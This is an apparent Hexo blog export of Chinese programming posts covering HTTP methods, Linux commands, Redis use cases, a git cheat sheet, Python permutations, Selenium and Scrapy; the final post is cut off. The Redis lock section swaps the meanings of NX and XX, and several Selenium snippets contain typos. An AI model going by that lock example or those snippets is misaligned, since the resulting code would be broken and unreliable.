PUT用于向指定的URI传送更新资源，是幂等的还是那个例子，用户的账户二维码只和用户关联，而且是一一对应的关系，此时这个api就可以用PUT，因为每次调用它，都将刷新用户账户二维码 http有几种方式?OPTIONS：返回服务器针对特定资源所支持的HTTP请求方法。也可以利用向Web服务器发送的请求来测试服务器的功能性。 HEAD：向服务器索要与GET请求相一致的响应，只不过响应体将不会被返回。这一方法可以在不必传输整个响应内容的情况下，就可以获取包含在响应消息头中的元信息。 GET：向特定的资源发出请求。 POST：向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的创建和/或已有资源的修改。 PUT：向指定资源位置上传其最新内容。 DELETE：请求服务器删除Request-URI所标识的资源。 TRACE：回显服务器收到的请求，主要用于测试或诊断。 CONNECT：HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。 解释下面linux命令的含义cat: 常用来显示文件内容，或者将几个文件连接起来显示，或者从标准输入读取内容并显示，它常与重定向符号配合使用。rsync: 更快更好地远程拷贝文件rm: 删除文件或目录grep: 在一个或多个文件中搜索字符串模板tcpdump: 是一个运行在命令行下的抓包工具strace: 常用来跟踪进程执行时的系统调用和所接收的信号chmod: 修改文件权限less: 对文件或其它输出进行分页显示的工具，可向前向后翻页，而more只能向后翻页netstat: 用于列出系统上所有的网络套接字连接情况，包括 tcp, udp 以及 unix 套接字，另外它还能列出处于监听状态（即等待接入请求）的套接字top: 实时显示系统中各个进程的资源占用状况telnet: 远程登录scp: linux系统下基于ssh登陆进行安全的远程文件拷贝命令 用最简洁的代码，将元素类型为int的list中大于100的元素输出到另一个list,并将后一个list中的元素从大到小排序123456import randomlstA = random.sample(range(1000), 100)lstB = list(filter(lambda x: x &gt; 100, lstA))lstB.sort(reverse=True)print(lstB) 给两个排好序的数组，找出重复的元素1234567891011121314151617181920212223import randomlstA = [1,5,8,14,16,25,28,39]# random.sample(range(1 &lt;&lt; 15), 1011)lstB = [2,3,6,8,12,13,16,21,25,28]# random.sample(range(1 &lt;&lt; 15), 2030)# lstA.sort()# lstB.sort()lenA = len(lstA)lenB = len(lstB)common = []i, j = 0, 0while i &lt; lenA and j &lt; lenB: if lstA[i] &lt; lstB[j]: i += 1 elif lstA[i] &gt; lstB[j]: j += 1 else: common.append(lstA[i]) i += 1 j += 1print(common) 给一个字符串，输出它的所有排列12345678910111213141516def arrangement(lst, length, index=0): if index == length - 1: print(''.join(lst)) return for pos in range(index, length): lst[pos], lst[index] = lst[index], lst[pos] arrangement(lst, length, index + 1) lst[pos], lst[index] = lst[index], lst[pos]def start_arrangement(iterable): lst = list(iterable) arrangement(lst, len(lst))start_arrangement('abcd') Python基础题写了一些题目。但是deploy时hexo报错,网上说是hexo模板的问题,有些特殊符号没正确处理。但是尝试了没解决…后面找到原因再补充… Python进阶题]]></content>
      <categories>
        <category>面试题</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>面试题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用python操作redis及redis的一些应用场景]]></title>
    <url>%2F%E7%94%A8python%E6%93%8D%E4%BD%9Credis%E5%8F%8Aredis%E7%9A%84%E4%B8%80%E4%BA%9B%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF.html</url>
    <content type="text"><![CDATA[想要体面生活,就得奋力拼搏 搜集了网上的一些资料并整理，方便以后学习和查询 redis简介redis是一个key-value存储系统。和Memcached类似，它支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)、zset(sorted set –有序集合)和hash（哈希类型）。这些数据类型都支持push/pop、add/remove及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上，redis支持各种不同方式的排序。与memcached一样，为了保证效率，数据都是缓存在内存中。区别的是redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步 redis安装网上很多windows、Linux的安装教程，可根据自己的需要寻找对应教程安装 redis-py安装pip install redis redis可视化工具RedisDesktopManager下载地址: https://redisdesktop.com/download API的使用redis-py 的API的使用可以分类为： 连接方式 直接连接 连接池 操作 String 操作 Hash 操作 List 操作 Set 操作 Sort Set 操作 管道 发布订阅 连接方式操作模式redis-py提供两个类Redis和StrictRedis用于实现Redis的命令，StrictRedis用于实现大部分官方的命令，并使用官方的语法和命令，Redis是StrictRedis的子类，用于向后兼容旧版本的redis-py。官方推荐使用StrictRedis方法123import redisr = redis.StrictRedis(host='127.0.0.1', port=6379, db=0) r.set('name', 'longofo')r.get('name') 连接池redis-py使用connection pool来管理对一个redis server的所有连接，避免每次建立、释放连接的开销。默认，每个Redis实例都会维护一个自己的连接池。可以直接建立一个连接池，然后作为参数Redis，这样就可以实现多个Redis实例共享一个连接池 12345import redis pool = redis.ConnectionPool(host='10.211.55.4', port=6379,db=0) r = redis.StrictRedis(connection_pool=pool) r.set('aaa', 'longe') print r.get('aaa') 操作可以参考https://docs.lvrui.io/2016/07/24/Python%E6%93%8D%E4%BD%9Credis%E8%AF%A6%E8%A7%A3/写的很详细 应用场景缓存作为Key-Value形态的内存数据库，Redis 最先会被想到的应用场景便是作为数据缓存。而使用 Redis 缓存数据非常简单，只需要通过string类型将序列化后的对象存起来即可，不过也有一些需要注意的地方： 必须保证不同对象的 key 不会重复，并且使 key 尽量短，一般使用类名（表名）加主键拼接而成。 选择一个优秀的序列化方式也很重要，目的是提高序列化的效率和减少内存占用。 缓存内容与数据库的一致性，这里一般有两种做法： 只在数据库查询后将对象放入缓存，如果对象发生了修改或删除操作，直接清除对应缓存（或设为过期）。 在数据库新增和查询后将对象放入缓存，修改后更新缓存，删除后清除对应缓存（或设为过期）。 消息队列Redis 中list的数据结构实现是双向链表，所以可以非常便捷的应用于消息队列（生产者 / 消费者模型）。消息的生产者只需要通过lpush将消息放入 list，消费者便可以通过rpop取出该消息，并且可以保证消息的有序性。如果需要实现带有优先级的消息队列也可以选择sorted set。而pub/sub功能也可以用作发布者 / 订阅者模型的消息。无论使用何种方式，由于 Redis 拥有持久化功能，也不需要担心由于服务器故障导致消息丢失的情况。 时间轴（Timeline）list作为双向链表，不光可以作为队列使用。如果将它用作栈便可以成为一个公用的时间轴。当用户发完微博后，都通过lpush将它存放在一个 key 为LATEST_WEIBO的list中，之后便可以通过lrange取出当前最新的微博。 排行榜使用sorted set和一个计算热度的算法便可以轻松打造一个热度排行榜，zrevrangebyscore可以得到以分数倒序排列的序列，zrank可以得到一个成员在该排行榜的位置（是分数正序排列时的位置，如果要获取倒序排列时的位置需要用zcard-zrank）。 计数器计数功能应该是最适合 Redis 的使用场景之一了，因为它高频率读写的特征可以完全发挥 Redis 作为内存数据库的高效。在 Redis 的数据结构中，string、hash和sorted set都提供了incr方法用于原子性的自增操作，下面举例说明一下它们各自的使用场景： 如果应用需要显示每天的注册用户数，便可以使用string作为计数器，设定一个名为REGISTERED_COUNT_TODAY的 key，并在初始化时给它设置一个到凌晨 0 点的过期时间，每当用户注册成功后便使用incr命令使该 key 增长 1，同时当每天凌晨 0 点后，这个计数器都会因为 key 过期使值清零。 每条微博都有点赞数、评论数、转发数和浏览数四条属性，这时用hash进行计数会更好，将该计数器的 key 设为weibo:weibo_id，hash的 field 为like_number、comment_number、forward_number和view_number，在对应操作后通过hincrby使hash 中的 field 自增。 如果应用有一个发帖排行榜的功能，便选择sorted set吧，将集合的 key 设为POST_RANK。当用户发帖后，使用zincrby将该用户 id 的 score 增长 1。sorted set会重新进行排序，用户所在排行榜的位置也就会得到实时的更新。 好友关系这个场景最开始是是一篇介绍微博 Redis 应用的 PPT 中看到的，其中提到微博的 Redis 主要是用在在计数和好友关系两方面上，当时对好友关系方面的用法不太了解，后来看到《Redis 设计与实现》中介绍到作者最开始去使用 Redis 便是希望能通过set解决传统数据库无法快速计算集合中交集这个功能。后来联想到微博当前的业务场景，确实能够以这种方式实现，所以姑且猜测一下： 对于一个用户 A，将它的关注和粉丝的用户 id 都存放在两个 set 中： A:follow：存放 A 所有关注的用户 id A:follower：存放 A 所有粉丝的用户 id 那么通过sinter命令便可以根据A:follow和A:follower的交集得到与 A 互相关注的用户。当 A 进入另一个用户 B 的主页后，A:follow和B:follow的交集便是 A 和 B 的共同专注，A:follow和B:follower的交集便是 A 关注的人也关注了 B。 分布式锁在 Redis 2.6.12 版本开始，string的set命令增加了三个参数： EX：设置键的过期时间（单位为秒） PX：设置键的过期时间（单位为毫秒） NX | XX：当设置为NX时，仅当 key 存在时才进行操作，设置为XX时，仅当 key 不存在才会进行操作 由于这个操作是原子性的，可以简单地以此实现一个分布式的锁，例如： set key &quot;lock&quot; EX 1 XX 如果这个操作返回false，说明 key 的添加不成功，也就是当前有人在占用这把锁。而如果返回true，则说明得了锁，便可以继续进行操作，并且在操作后通过del命令释放掉锁。并且即使程序因为某些原因并没有释放锁，由于设置了过期时间，该锁也会在 1 秒后自动释放，不会影响到其他程序的运行。 倒排索引倒排索引是构造搜索功能的最常见方式，在 Redis 中也可以通过set进行建立倒排索引，这里以简单的拼音 + 前缀搜索城市功能举例： 假设一个城市北京，通过拼音词库将北京转为beijing，再通过前缀分词将这两个词分为若干个前缀索引，有：北、北京、b、be…beijin和beijing。将这些索引分别作为set的 key（例如:index:北）并存储北京的 id，倒排索引便建立好了。接下来只需要在搜索时通过关键词取出对应的set并得到其中的 id 即可。 关于倒排索引可以查看https://blog.csdn.net/u011239443/article/details/60604017]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[git命令清单]]></title>
    <url>%2Fgit%E5%91%BD%E4%BB%A4%E6%B8%85%E5%8D%95.html</url>
    <content type="text"><![CDATA[经常翻看，受益终生 前言Git很多命令记不住 一般来说，日常使用只要记住下图6个命令，就可以了。 Git 命令清单。几个专用名词的译名如下: Workspace：工作区 Index / Stage：暂存区 Repository：仓库区（或本地仓库） Remote：远程仓库 新建代码库12345678# 在当前目录新建一个Git代码库$ git init# 新建一个目录，将其初始化为Git代码库$ git init [project-name]# 下载一个项目和它的整个代码历史$ git clone [url] 配置Git的设置文件为.gitconfig，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。 123456789# 显示当前的Git配置$ git config --list# 编辑Git配置文件$ git config -e [--global]# 设置提交代码时的用户信息$ git config [--global] user.name "[name]"$ git config [--global] user.email "[email address]" 增加/删除文件123456789101112131415161718192021# 添加指定文件到暂存区$ git add [file1] [file2] ...# 添加指定目录到暂存区，包括子目录$ git add [dir]# 添加当前目录的所有文件到暂存区$ git add .# 添加每个变化前，都会要求确认# 对于同一个文件的多处变化，可以实现分次提交$ git add -p# 删除工作区文件，并且将这次删除放入暂存区$ git rm [file1] [file2] ...# 停止追踪指定文件，但该文件会保留在工作区$ git rm --cached [file]# 改名文件，并且将这个改名放入暂存区$ git mv [file-original] [file-renamed] 代码提交123456789101112131415161718# 提交暂存区到仓库区$ git commit -m [message]# 提交暂存区的指定文件到仓库区$ git commit [file1] [file2] ... -m [message]# 提交工作区自上次commit之后的变化，直接到仓库区$ git commit -a# 提交时显示所有diff信息$ git commit -v# 使用一次新的commit，替代上一次提交# 如果代码没有任何新变化，则用来改写上一次commit的提交信息$ git commit --amend -m [message]# 重做上一次commit，并包括指定文件的新变化$ git commit --amend [file1] [file2] 分支123456789101112131415161718192021222324252627282930313233343536373839404142# 列出所有本地分支$ git branch# 列出所有远程分支$ git branch -r# 列出所有本地分支和远程分支$ git branch -a# 新建一个分支，但依然停留在当前分支$ git branch [branch-name]# 新建一个分支，并切换到该分支$ git checkout -b [branch]# 新建一个分支，指向指定commit$ git branch [branch] [commit]# 新建一个分支，与指定的远程分支建立追踪关系$ git branch --track [branch] [remote-branch]# 切换到指定分支，并更新工作区$ git checkout [branch-name]# 切换到上一个分支$ git checkout -# 建立追踪关系，在现有分支与指定的远程分支之间$ git branch --set-upstream [branch] [remote-branch]# 合并指定分支到当前分支$ git merge [branch]# 选择一个commit，合并进当前分支$ git cherry-pick [commit]# 删除分支$ git branch -d [branch-name]# 删除远程分支$ git push origin --delete [branch-name]$ git branch -dr [remote/branch] 标签1234567891011121314151617181920212223242526# 列出所有tag$ git tag# 新建一个tag在当前commit$ git tag [tag]# 新建一个tag在指定commit$ git tag [tag] [commit]# 删除本地tag$ git tag -d [tag]# 删除远程tag$ git push origin :refs/tags/[tagName]# 查看tag信息$ git show [tag]# 提交指定tag$ git push [remote] [tag]# 提交所有tag$ git push [remote] --tags# 新建一个分支，指向某个tag$ git checkout -b [branch] [tag] 查看信息123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960# 显示有变更的文件$ git status# 显示当前分支的版本历史$ git log# 显示commit历史，以及每次commit发生变更的文件$ git log --stat# 搜索提交历史，根据关键词$ git log -S [keyword]# 显示某个commit之后的所有变动，每个commit占据一行$ git log [tag] HEAD --pretty=format:%s# 显示某个commit之后的所有变动，其"提交说明"必须符合搜索条件$ git log [tag] HEAD --grep feature# 显示某个文件的版本历史，包括文件改名$ git log --follow [file]$ git whatchanged [file]# 显示指定文件相关的每一次diff$ git log -p [file]# 显示过去5次提交$ git log -5 --pretty --oneline# 显示所有提交过的用户，按提交次数排序$ git shortlog -sn# 显示指定文件是什么人在什么时间修改过$ git blame [file]# 显示暂存区和工作区的差异$ git diff# 显示暂存区和上一个commit的差异$ git diff --cached [file]# 显示工作区与当前分支最新commit之间的差异$ git diff HEAD# 显示两次提交之间的差异$ git diff [first-branch]...[second-branch]# 显示今天你写了多少行代码$ git diff --shortstat "@&#123;0 day ago&#125;"# 显示某次提交的元数据和内容变化$ git show [commit]# 显示某次提交发生变化的文件$ git show --name-only [commit]# 显示某次提交时，某个文件的内容$ git show [commit]:[filename]# 显示当前分支的最近几次提交$ git reflog 远程同步1234567891011121314151617181920212223# 下载远程仓库的所有变动$ git fetch [remote]# 显示所有远程仓库$ git remote -v# 显示某个远程仓库的信息$ git remote show [remote]# 增加一个新的远程仓库，并命名$ git remote add [shortname] [url]# 取回远程仓库的变化，并与本地分支合并$ git pull [remote] [branch]# 上传本地指定分支到远程仓库$ git push [remote] [branch]# 强行推送当前分支到远程仓库，即使有冲突$ git push [remote] --force# 推送所有分支到远程仓库$ git push [remote] --all 撤销123456789101112131415161718192021222324252627# 恢复暂存区的指定文件到工作区$ git checkout [file]# 恢复某个commit的指定文件到暂存区和工作区$ git checkout [commit] [file]# 恢复暂存区的所有文件到工作区$ git checkout .# 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变$ git reset [file]# 重置暂存区与工作区，与上一次commit保持一致$ git reset --hard# 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变$ git reset [commit]# 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致$ git reset --hard [commit]# 重置当前HEAD为指定commit，但保持暂存区和工作区不变$ git reset --keep [commit]# 新建一个commit，用来撤销指定commit# 后者的所有变化都将被前者抵消，并且应用到当前分支$ git revert [commit]]]></content>
      <categories>
        <category>git</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python实现全排列]]></title>
    <url>%2Fpython%E5%AE%9E%E7%8E%B0%E5%85%A8%E6%8E%92%E5%88%97.html</url>
    <content type="text"><![CDATA[要靠别人的错误繁荣自己。 全排列不在原列表上操作12345678910111213141516171819202122232425#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2018-04-03 20:39:49# @Author : longofo# @Email : # @Link : http://longofo.ccdef permutation(lst): # print(id(lst)) if len(lst) &lt;= 1: yield lst if lst else [] else: for index, _ in enumerate(lst): for per in permutation(lst[0:index] + lst[index + 1:]): yield list(lst[index]) + perif __name__ == '__main__': lst = list('abc') for per_lst in permutation(lst): print(' '.join(per_lst)) # pass 测试结果:1234567a b ca c bb a cb c ac a bc b a[Finished in 0.1s] 在原列表上操作（执行交换）12345678910111213141516171819202122232425#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2018-04-03 17:59:56# @Author : longofo# @Email : # @Link : http://longofo.ccdef permutation(lst, start, length): # print(id(lst)) if (start == length): print(' '.join(lst)) # pass for index in range(start, length): lst[start], lst[index] = lst[index], lst[start] permutation(lst, start + 1, length) lst[start], lst[index] = lst[index], lst[start]if __name__ == '__main__': lst = list('abc') permutation(lst, 0, len(lst)) 测试结果:1234567a b ca c bb a cb c ac b ac a b[Finished in 0.1s] py大法12345678910111213141516171819#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2018-04-03 20:39:49# @Author : longofo# @Email : # @Link : http://longofo.ccimport itertoolsdef permutation(lst): for per in itertools.permutations(lst, len(lst)): print(' '.join(per))if __name__ == '__main__': lst = list('abc') permutation(lst) 运行结果：1234567a b ca c bb a cb c ac a bc b a[Finished in 0.1s] 对比分析py大法就不用说了，肯定是经过了各种优化 这里看下前两种方式每次lst的id号: 第一种： 123456789101112131415161718192021222324#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2018-04-03 20:39:49# @Author : longofo# @Email : # @Link : http://longofo.ccdef permutation(lst): print(id(lst)) if len(lst) &lt;= 1: yield lst if lst else [] else: for index, _ in enumerate(lst): for per in permutation(lst[0:index] + lst[index + 1:]): yield list(lst[index]) + perif __name__ == '__main__': lst = list('abc') for per_lst in permutation(lst): # print(' '.join(per_lst)) pass 结果: 12345678910112743162906952274316296269627431629627602743162962824274316290567227431629048402743162905544274316296276027431629687762743162968840[Finished in 0.3s] 第二种方式: 1234567891011121314151617181920212223#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2018-04-03 17:59:56# @Author : longofo# @Email : # @Link : http://longofo.ccdef permutation(lst, start, length): print(id(lst)) if (start == length): # print(' '.join(lst)) pass for index in range(start, length): lst[start], lst[index] = lst[index], lst[start] permutation(lst, start + 1, length) lst[start], lst[index] = lst[index], lst[start]if __name__ == '__main__': lst = list('abc') permutation(lst, 0, len(lst)) 结果: 12345678910111213141516171574917631432157491763143215749176314321574917631432157491763143215749176314321574917631432157491763143215749176314321574917631432157491763143215749176314321574917631432157491763143215749176314321574917631432[Finished in 0.1s] 可以看到用第一种方式时每次都产生了新对象，栈上需要额外的空间来保存这些对象，而第二种只有最初的那个对象。所以当排列的列表很大时，第一种方式是不合适的。]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python selenium的基本使用]]></title>
    <url>%2Fpython%20selenium%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8.html</url>
    <content type="text"><![CDATA[在比夜更深的地方，一定有比夜更黑的眼睛！ 安装pip安装selenium：1pip install selenium 安装对应的驱动点这里（下面将使用chrome为例，使用的是chromedriver，注意浏览器版本和driver要对应，不然使用是会出错） 基本使用示例123456789101112131415161718192021222324252627#-*- coding:utf-8 -*-from selenium import webdriverfrom selenium.webdriver.common.by import By # 选择器，ID，CSS，XPATH等from selenium.webdriver.common.keys import Keys from selenium.webdriver.support import expected_conditions as EC # 条件from selenium.webdriver.support.wait import WebDriverWait # 等待：显示等待和隐式等待browser = webdriver.Chrome()wait = WebDriverWait(browser,10)try: browser.get('https://www.baidu.com') inputs = browser.find_element_by_id('kw') inputs.send_keys('Python') inputs.send_keys(Keys.ENTER) wait.until(EC.presence_of_element_located((By.ID,'content_left'))) print(browser.current_url) print(browser.get_cookies) with open('D:/Desktop/test.html','w',encoding='utf8') as f: f.write(browser.page_source)except Exception as e: print(e.args)finally: browser.quit() 申明浏览器对象123456from selenium import webdriverbrowser = webdriver.Chrome()browser = webdriver.Firefox()browser = webdriver.Edge()browser = webdriver.Phatomjs() 访问页面12browser.get('http://www.baidu.com)print(browser.page_source) 查找元素单个元素:12345input_first = browser.find_element_by_id('q')input_second = browser.find_element_css_selector('#q')input_thrid = browser.find_element_by_xpath('//*[@id="q"]')print(input_first,input_second,input_thrid)browser.close() 也可以:123from selenium.wendriver.commom.by import Byinput_first = browser.find_element(By.ID,'q') 多个元素:12lis = browser.find_elements_by_CSS_selector('.service-db li')lis1 = browser.find_elements(By.CSS_SELECTOR,'.service-db li') 其他方法：1234567find_elements_by_name()find_elements_by_link_text()find_elements_by_partail_link_text()find_elements_by_tag_name()find_elements_by_class_name()find_elements_by_css_selector()find_elements_by_xpath() 元素交互操作(对获取到的按钮、文本框操作)：1234567input = browser.find_element_by_id('q')input_send_keys('iPhone')time.slepp(1)input.clear()input.send_keys('iPad')button = browser.find_element_by_class_name('btn-search')button.click() 交互动作(将动作附加到动作链中串行执行):演示拖拽：12345678from selenium.wendriver import ActionChainssource = browser.switch_to.frame('iframeResult')source = browser.find_element_by_css_selector('#draggable')target = browser.find_element_by_css_selector('#droppable')actions = ActionChains(browser)actions.drag_and_drop(source,target)actions.perform() ActionChains方法列表:123456789101112131415click(on_element=None) ——单击鼠标左键 click_and_hold(on_element=None) ——点击鼠标左键，不松开 context_click(on_element=None) ——点击鼠标右键 double_click(on_element=None) ——双击鼠标左键drag_and_drop(source, target) ——拖拽到某个元素然后松开 drag_and_drop_by_offset(source, xoffset, yoffset) ——拖拽到某个坐标然后松开key_down(value, element=None) ——按下某个键盘上的键key_up(value, element=None) ——松开某个键move_by_offset(xoffset, yoffset) ——鼠标从当前位置移动到某个坐标move_to_element(to_element) ——鼠标移动到某个元素 move_to_element_with_offset(to_element, xoffset, yoffset) ——移动到距某个元素（左上角坐标）多少 距离的位置perform() ——执行链中的所有动作 release(on_element=None) ——在某个元素位置松开鼠标左键 send_keys(*keys_to_send) ——发送某个键到当前焦点的元素 send_keys_to_element(element, *keys_to_send) ——发送某个键到指定元素 执行JavaScript(某些动作比较难实现的时候，可以用Javascript实现):1234browser = webdriver.Chrome()browser.get('https://www.zhihu.com/explore')browser.execute_script('windows.scrollTo(0,document.body.scrollHeight)')browser.execute_script('alert('To bottom')') 获取属性、文本值、ID、位置、大小等：获取属性：123logo = browser.find_element_by_id('zh-top-link-logo')print(logo)print(logo.get_attrbute('class')) 获取文本值：1print(logo.text) 获取ID、位置、标签名、大小：1234print(logo.id)print(logo.location)print(logo.tag_name)print(logo.size) Frame123from selenium.common.exceptions import NoSuchElementExceptionbrowser.switch_to.frame('iframeResult') 等待隐式测试 当使用了隐式等待执行测试的时候，如果WebDriver没有在DOM中找到元素,将继续等待，超出时间后则抛出异常。换句话说，当查找元素或元素并没有立即出现的时候，隐式等待将等待一段时间再查找DOM的默认时间是012345browser = webdriver.Chrome()browser.implicitly_wait(10)browser.get('https://www.zhihu.com/explore')inputs = browser.find_element_by_class_name('zu-top-add-question') # 如果没找到，则等待，10秒内还没找到，就抛出异常print(inputs) 显示等待:12345678910from selenium.wendriver.common.by import Byfrom selenium.webdriver.support.ui import WebDriverWaitfrom selenium.webdriver.support import expected_conditions as ECbrowser.get('https://www.taobao.com')wait = WebDriverWait(browser,10)inputs = wai.until(EC.presence_of_element_locate(By.ID,'q'))button = wait.until(EC.element_to_be_clickable(By.CSS_SELECTOR,'.btn-search'))print(inputs,button) 显示等待的一些条件: title_is 标题是某内容 title_contains 标题包含某内容 presence_of_element_located 元素加载出，传入定位元组，如(By.ID,’q’) visibility_of_element_located 元素可见，传入定位元组 visiblity_of 可见,传入元素对象 presence_of_all_elements_located 所有元素加载出 text_to_be_present_in_element 某个元素文本包含某文字…还有很多，可参看文档 ccookies12browser.get_cookies()browser.add_cookies(&#123;'xxx':'xxx','xxx':'xxx'&#125;) 选项卡管理(打开窗口、切换窗口)123browser.execute_script('windows.open()')print(browser.windows_handles)browser.switch_to_window(browser.windows_hangles[1]) 异常处理1from selenium.common.exceptions import TimeoutException,NoSuchElementException 无界面:需要chrome需要60版本以上 1234567891011from selenium import webdriverfrom selenium.webdriver.chrome.options import Optionsoptions=Options()options.add_argument('--headless')options.add_argument('--disable-gpu')web=webdriver.Chrome(chrome_options=options)web.get('[http://www.kandianbao.com/'](http://www.kandianbao.com/');)print(web.page_source)web.quit() selenium动态定位id、class 根据其他属性定位如果有其他固定属性，最先考虑的当然是根据元素的其他属性来定位，定位方式那么多，何必在这一棵树上吊死。。 根据相对关系定位根据其附近的父节点、子节点、兄弟节点定位，关于这方面，可参考：Python selenium —— 父子、兄弟、相邻节点定位方式详解 根据DOM顺序index定位这个很简单，找到该元素在主文档或某级父节点中的index，然后根据index可轻松定位，不过这种方式可能不够稳定，如果可以，还是用其他的方法定位更加合适。 根据部分元素属性定位xpath中提供了三个非常好的方法来为我们定位部分属性值： 123456driver.find_element_by_xpath("//div[contains(@id, 'btn-attention')]")driver.find_element_by_xpath("//div[starts-with(@id, 'btn-attention')]")driver.find_element_by_xpath("//div[ends-with(@id, 'btn-attention')]") # 这个需要结尾是'btn-attention'contains(a, b) 如果a中含有字符串b，则返回true，否则返回falsestarts-with(a, b) 如果a是以字符串b开头，返回true，否则返回falseends-with(a, b) 如果a是以字符串b结尾，返回true，否则返回false 这里要多嘴一句，各种浏览器对xpath的支持情况不一样，像IE就差点，所以有时候会出现xpath在一个浏览器能定位到但在另一个浏览器定位不到的问题，不要惊讶。。 附上一个此类型问题： Xpath “ends-with” does not work 参考 python selenium中文文档 python selenium英文文档]]></content>
      <categories>
        <category>爬虫</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>selenium</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[scrapy架构简介与基本操作]]></title>
    <url>%2Fscrapy%E6%9E%B6%E6%9E%84%E7%AE%80%E4%BB%8B%E4%B8%8E%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C.html</url>
    <content type="text"><![CDATA[不求与人相比，但求超越自己，要哭就哭出激动的泪水，要笑就笑出成长的性格！ scrapy处理的大致流程 Scrapy是一个为了爬取网站数据，提取结构性数据而编写的应用框架。 可以应用在包括数据挖掘，信息处理或存储历史数据等一系列的程序中。 其最初是为了页面抓取 (更确切来说, 网络抓取 )所设计的， 也可以应用在获取API所返回的数据(例如 Amazon Associates Web Services ) 或者通用的网络爬虫。Scrapy用途广泛，可以用于数据挖掘、监测和自动化测试 Scrapy主要包括了以下组件： 引擎(Scrapy): 用来处理整个系统的数据流处理, 触发事务(框架核心) 调度器(Scheduler): 用来接受引擎发过来的请求, 压入队列中, 并在引擎再次请求的时候返回. 可以想像成一个URL（抓取网页的网址或者说是链接）的优先队列, 由它来决定下一个要抓取的网址是什么, 同时去除重复的网址 下载器(Downloader): 用于下载网页内容, 并将网页内容返回给蜘蛛(Scrapy下载器是建立在twisted这个高效的异步模型上的) 爬虫(Spiders): 爬虫是主要干活的, 用于从特定的网页中提取自己需要的信息, 即所谓的实体(Item)。用户也可以从中提取出链接,让Scrapy继续抓取下一个页面 项目管道(Pipeline): 负责处理爬虫从网页中抽取的实体，主要的功能是持久化实体、验证实体的有效性、清除不需要的信息。当页面被爬虫解析后，将被发送到项目管道，并经过几个特定的次序处理数据。 下载器中间件(Downloader Middlewares): 位于Scrapy引擎和下载器之间的框架，主要是处理Scrapy引擎与下载器之间的请求及响应。 爬虫中间件(Spider Middlewares): 介于Scrapy引擎和爬虫之间的框架，主要工作是处理蜘蛛的响应输入和请求输出。 调度中间件(Scheduler Middewares): 介于Scrapy引擎和调度之间的中间件，从Scrapy引擎发送到调度的请求和响应。 Scrapy运行流程大概如下： 首先，引擎从调度器中取出一个链接(URL)用于接下来的抓取 引擎把URL封装成一个请求(Request)传给下载器，下载器把资源下载下来，并封装成应答包(Response) 然后，爬虫解析Response 若是解析出实体（Item）,则交给实体管道进行进一步的处理。 若是解析出的是链接（URL）,则把URL交给Scheduler等待抓取 如何使用?运行scrapy startproject tutorial(名称自己定)运行scrapy genspider example example.com可以看到生成了如下目录结构:1234567891011├── tutorial ├── scrapy.cfg └── tutorial ├── __init__.py ├── middlewares.py ├── items.py ├── pipelines.py ├── settings.py └── spiders └── example.py └── __init__.py 目录解析: items.py用来保存数据的结构 middlewares.py爬取过程中用来处理request,response,exception的操作 pipelines.py项目管道,用来处理item数据 settings.py配置信息 主要代码在spiders下的example.py编写解析规则 scrapy的选择器示例Example：123456789101112131415&lt;html&gt; &lt;head&gt; &lt;base href='[http://example.com/'](http://example.com/'); /&gt; &lt;title&gt;Example website&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div id='images'&gt; &lt;a href='image1.html'&gt;Name: My image 1 &lt;br /&gt;&lt;img src='image1_thumb.jpg' /&gt;&lt;/a&gt; &lt;a href='image2.html'&gt;Name: My image 2 &lt;br /&gt;&lt;img src='image2_thumb.jpg' /&gt;&lt;/a&gt; &lt;a href='image3.html'&gt;Name: My image 3 &lt;br /&gt;&lt;img src='image3_thumb.jpg' /&gt;&lt;/a&gt; &lt;a href='image4.html'&gt;Name: My image 4 &lt;br /&gt;&lt;img src='image4_thumb.jpg' /&gt;&lt;/a&gt; &lt;a href='image5.html'&gt;Name: My image 5 &lt;br /&gt;&lt;img src='image5_thumb.jpg' /&gt;&lt;/a&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 两种选择方式: response.xpath() response.css()12345678response.xpath('//title/text()').extract_first()response.css('title::text').extract_first()response.xpath('//div[@id="not-exists"]/text()').extract_first() is None==&gt; Trueresponse.xpath('//div[@id="not-exists"]/text()').extract_first(default='not fount')==&gt; not foundresponse.xpath('//base/@href').extract()response.css('base::attr(href)').extract()response.xpath('//a[contains(@href,"image")]/@href').extract()response.css('a[href*=image]::attr(href)').extract() 选择附近的元素：1234links = response.xpath('//a[contains(@href, "image")]')for index,link in enumerate(links): args = (index, link.xpath('@href').extract(),link.xpath('img/@src').extract()) print 'Link number %d points to url %s and image %s' % args 注：使用xpath时如果要在当前元素下继续选择元素需要使用.//而不是//。。因为//会从整个文档解 析 使用正则:12response.xpath('//a[contains(@href, 